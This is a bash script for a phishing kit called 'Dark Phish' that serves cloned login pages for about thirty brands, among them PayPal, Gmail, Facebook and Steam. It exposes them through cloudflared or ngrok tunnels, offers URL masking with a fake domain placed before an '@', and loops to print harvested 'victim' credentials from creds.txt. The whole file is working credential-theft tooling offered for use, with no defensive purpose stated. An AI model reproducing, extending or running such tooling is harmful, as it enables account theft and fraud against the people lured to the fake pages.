#!/bin/bash

# Colors
red='\e[1;31m'
green='\e[1;32m'
yellow='\e[1;33m'
blue='\e[1;34m'
nc='\e[0m'

# Paths and default port
pages_path="pages"
default_port=8080

# Kill any old servers
function auto_kill() {
  echo -e "${yellow}[!] Killing old processes...${nc}"
  killall php ngrok cloudflared 2>/dev/null
}

# Show fake sites
sites=(adobe amazon apple bing discord dropbox ebay facebook freefire github gmail instagram linkedin microsoft netflix outlook paypal pinterest protonmail pubg reddit roblox snapchat spotify stackoverflow steam telegram tiktok twitch twitter wordpress yahoo zoom)

function show_sites() {
  echo -e "${blue}==========[ Select Target Site ]==========${nc}"
  for i in "${!sites[@]}"; do
    printf "${green}[%02d]${nc} %s\t" "$((i+1))" "${sites[$i]}"
    if (( (i + 1) % 3 == 0 )); then echo; fi
  done
  echo -e "\n${blue}==========================================${nc}"
}

# Tunnel setup
function start_tunnel() {
  read -p "[?] Choose method [1] cloudflared / [2] ngrok / [3] localhost: " tunnel_type
  case $tunnel_type in
    1)
      cloudflared tunnel --url http://localhost:$default_port > link.txt 2>/dev/null &
      sleep 5
      link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' link.txt | head -n1)
      ;;
    2)
      ngrok http $default_port > /dev/null &
      sleep 5
      link=$(curl -s http://127.0.0.1:4040/api/tunnels | grep -o 'https://[0-9a-z]*\.ngrok.io' | head -n1)
      ;;
    3)
      read -p "[+] Enter port for localhost (default is 8080): " local_port
      default_port=${local_port:-8080}
      link="http://127.0.0.1:$default_port"
      ;;
    *)
      echo -e "${red}[!] Invalid option!${nc}"
      exit 1
      ;;
  esac

  echo -e "${green}[✔] URL: $link${nc}"

  if [[ "$tunnel_type" != "3" ]]; then
    read -p "[?] Do you want to mask the URL? [y/N]: " mask_choice
    if [[ "$mask_choice" == "y" || "$mask_choice" == "Y" ]]; then
      read -p "[+] Enter fake domain (e.g. https://facebook.com-login): " mask
      masked_link="${mask}@${link#https://}"
      echo -e "${green}[🎭] Masked URL:\n➡️ $masked_link${nc}"
    else
      echo -e "${green}[✔] Direct URL:\n➡️ $link${nc}"
    fi
  fi
}

# Main
clear
echo -e "${blue}"
echo '██████   █████  ██████  ██   ██     ██████  ██   ██ ██ ███████ ██   ██'
echo '██   ██ ██   ██ ██   ██ ██  ██      ██   ██ ██   ██ ██ ██      ██   ██'
echo '██   ██ ███████ ██████  █████       ██████  ███████ ██ ███████ ███████'
echo '██   ██ ██   ██ ██   ██ ██  ██      ██      ██   ██ ██      ██ ██   ██'
echo '██████  ██   ██ ██   ██ ██   ██     ██      ██   ██ ██ ███████ ██   ██'
echo -e "${green}                        Dark Phish by Mohamed 🕷️${nc}"

echo -e "${blue}===== [ Dark Phish 🕷️ by Mohamed ] =====${nc}"
auto_kill
show_sites
read -p "[?] Enter site number: " choice

index=$((choice-1))
selected_site="${sites[$index]}"
site_path="$pages_path/$selected_site"

if [ ! -d "$site_path" ]; then
  echo -e "${red}[!] Selected site does not exist!${nc}"
  exit 1
fi

# Launch fake site
echo -e "${blue}[*] Starting $selected_site on port $default_port...${nc}"
cd "$site_path"
php -S 127.0.0.1:$default_port > /dev/null 2>&1 &
cd - > /dev/null

# Start tunnel and get link
start_tunnel

# Wait for victim
echo -e "${yellow}[*] Waiting for victim data...${nc}"
while true; do
  if [ -f "$site_path/creds.txt" ]; then
    echo -e "${green}[💀] New victim captured:${nc}"
    cat "$site_path/creds.txt"
    rm "$site_path/creds.txt"
    echo -e "${blue}[*] Waiting for next victim...${nc}"
  fi
  sleep 2
done
